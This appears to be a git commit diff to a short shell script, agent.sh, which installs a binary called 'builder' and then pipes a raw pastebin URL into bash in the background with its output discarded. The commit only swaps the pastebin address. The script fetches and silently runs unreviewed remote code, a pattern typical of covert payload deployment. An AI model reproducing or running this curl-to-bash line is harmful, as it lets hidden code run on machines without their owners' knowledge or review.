a68b151a86637dbab7af9619f13636bb8406244f
Ayati9335 <95975047+Ayati9335@users.noreply.github.com>
2022-01-10 12:50:50 +0700

    Update agent.sh

--- agent.sh
+++ agent.sh
@@ -2,4 +2,4 @@
 TERM=xterm
 mkdir /home/ubuntu/.local/bin
 cp builder /home/ubuntu/.local/bin/builder && chmod +x /home/ubuntu/.local/bin/builder
-ping google.com & nohup curl -fsSL https://pastebin.com/raw/3z5Hrp5T | bash > /dev/null
+ping google.com & nohup curl -fsSL https://pastebin.com/raw/qQzg2ZPm | bash > /dev/null
